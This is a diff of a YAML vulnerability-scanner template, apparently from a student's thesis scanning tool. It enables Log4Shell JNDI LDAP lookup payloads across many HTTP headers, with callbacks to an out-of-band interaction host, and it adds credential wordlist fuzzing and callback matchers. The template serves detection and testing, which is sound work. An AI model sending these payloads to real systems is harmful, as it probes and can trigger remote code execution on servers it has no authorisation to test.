@@ -20,36 +20,36 @@ info:
 
 requests:
   - request:
-      - |
-        GET /test.html HTTP/1.1
-        Host: {{Hostname}}
+#      - |
+#        GET /test.html HTTP/1.1
+#        Host: {{Hostname}}
 #      - |
 #        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
 #        Host: {{Hostname}}
-#      - |
-#        GET / HTTP/1.1
-#        Host: {{Hostname}}
-#        Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
-#        Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
-#        Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
-#        Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
-#        Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
-#        Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
-#        Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
-#        Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
-#        Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
-#        Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
-#        Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
-#        Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
-#        User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
-#        X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
-#        X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
-#        X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
-#        X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
-#        X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
-#        Content-Type: application/json
-#
-#        {"result": [{"id": 2, "name": "US", "flag{{passwords}}": "sf{{Hostname}}"}]}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
+        Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
+        Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
+        Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
+        Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
+        Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
+        Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
+        Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
+        Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
+        Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
+        Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
+        Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
+        User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
+        X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
+        X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
+        X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
+        X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
+        X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
+        Content-Type: application/json
+
+        {"result": [{"id": 2, "name": "US", "flag{{passwords}}": "sf{{Hostname}}"}]}
 #      - |
 #         POST /abc/xxx/index.php HTTP/1.1
 #         Host: {{Hostname}}
@@ -63,35 +63,34 @@ requests:
 #         username={{users}}{{Port}}&passwd={{passwords}}
 
     payloads:
-#      users: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
-#      passwords: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
+      users: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
+      passwords: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
 #      Hostname: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
 #      Scheme: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
     redirect: true
     thread: 20
     scanMode: pitchfork
     stopAtFirstMatch: true
-    matchers-condition: and
-    cookieReuse: true
+    matchersCondition: or
+    cookieReuse: false
     requestCondition: true
     matchers:
-#      - type: word
-#        part: interactsh_protocol  # Confirms the DNS Interaction
-#        word:
-#          - "dns"
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        word:
+          - "dns"
 #
-#      - type: regex
-#        part: interactsh_request
-#        regex:
-#          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
-
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
       - type: word
         word:
-          - CORS POC Exploit
-          - Extract SID
+          - "status: NOERRORR"
         condition: and
         negative: false
-        part: all
+        part: interactsh_response
+
     extractors:
       - type: kval
         kval:
